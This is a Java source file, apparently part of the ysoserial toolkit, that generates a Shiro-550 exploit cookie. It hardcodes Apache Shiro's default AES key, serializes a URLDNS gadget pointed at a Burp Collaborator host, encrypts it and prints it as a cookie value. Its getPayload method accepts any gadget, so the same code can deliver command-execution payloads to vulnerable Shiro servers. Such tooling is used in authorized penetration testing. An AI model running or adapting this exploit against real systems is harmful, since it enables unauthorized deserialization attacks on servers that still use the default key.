package ysoserial.payloads;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;
import ysoserial.Serializer;

public class Shiro_550 {
    public static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    public static CipherService cipherService = new AesCipherService();
    public static void main(String[] args) throws Exception{
        Object evil = new URLDNS().getObject("http://7iqweabe6nz9u6subovv9j87cyip6e.burpcollaborator.net");
        String payload = Shiro_550.getPayload(evil);
        System.out.println(payload);
    }
    public static byte[] encrypt(byte[] serialized) {
        ByteSource byteSource = cipherService.encrypt(serialized, DEFAULT_CIPHER_KEY_BYTES);
        return byteSource.getBytes();
    }
    public static String getPayload(final Object evil) throws Exception{
        byte[] ser = Serializer.serialize(evil);
        byte[] cookie = encrypt(ser);
        cookie = Base64.encode(cookie);
        return new String(cookie);
    }
}
